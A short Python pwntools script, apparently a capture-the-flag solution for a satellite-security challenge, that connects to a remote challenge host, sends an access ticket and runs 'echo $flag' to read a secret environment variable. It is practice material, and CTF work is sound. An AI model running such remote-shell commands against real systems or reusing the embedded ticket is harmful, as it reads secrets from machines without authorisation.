from pwn import *

# Connect to the remote server
host = "basic-async-aip7aibe.eames.satellitesabove.me"
port = 443
conn = remote(host, port)

# Retrieve the value of the "flag" environment variable
conn.sendline("ticket{echo792778tango4:GM2O0NdZcZyD3kNRuZajB57R3H2RdBwdn_6p-I2DZykI9mKMdUM48O1g6QEHpuIEBg}")
conn.sendline("echo $flag")
flag = conn.recvline().decode().strip()

# Check if the "flag" environment variable is set
if not flag:
    print("The 'flag' environment variable is not set.")
    exit(1)

# Print the value of the "flag" environment variable to the console
print(f"The value of the 'flag' environment variable is: {flag}")

